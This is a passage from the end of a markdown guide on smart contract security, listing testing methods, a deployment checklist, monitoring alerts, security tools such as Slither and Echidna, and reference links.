- Fuzz testing (Echidna, Foundry)
- Static analysis (Slither, Mythril)
- Formal verification (Certora)
- Unit and integration tests
- Adversarial testing (try to break it!)
- Gas optimization testing

### 3. Deployment Checklist
- [ ] Get professional audit
- [ ] Implement upgrade mechanism (proxy pattern)
- [ ] Use time-locks for governance
- [ ] Implement pause/emergency mechanisms
- [ ] Set up monitoring and alerting
- [ ] Have incident response plan
- [ ] Gradual rollout with limited TVL
- [ ] Multi-sig control for critical functions

### 4. Monitoring and Alerts
- Price deviation alerts
- Unusual transaction patterns
- Access control events
- Large withdrawal/transfer events
- Governance proposal alerts
- Gas price spikes
- MEV detection

---

## Tools and Resources

### Security Tools
- **Slither**: Static analysis tool by Trail of Bits
- **Mythril**: EVM bytecode analysis
- **Echidna**: Fuzzing tool for smart contracts
- **Certora Prover**: Formal verification platform
- **Manticore**: Symbolic execution tool
- **Etherscan**: View contract code and transactions
- **OpenZeppelin Defender**: Monitoring and automation

### Resources
- OpenZeppelin Contracts: https://github.com/OpenZeppelin/openzeppelin-contracts
- Consensys Smart Contract Best Practices: https://consensys.github.io/smart-contract-best-practices/
- SWC Registry: https://swcregistry.io/
- Awesome DeFi: https://github.com/ong/awesome-decentralized-finance

---

## References

- Solidity Documentation: https://docs.soliditylang.org/
- Ethereum Yellow Paper
- EIPs (Ethereum Improvement Proposals)
- Academic papers on blockchain security
- Real audit reports and post-mortems
- MythX Documentation
- Uniswap V2/V3 Audits
- Yearn Finance Security Docs

---

**Last Updated**: 2024
**Contribution**: Please contribute improvements and additional attack vectors!
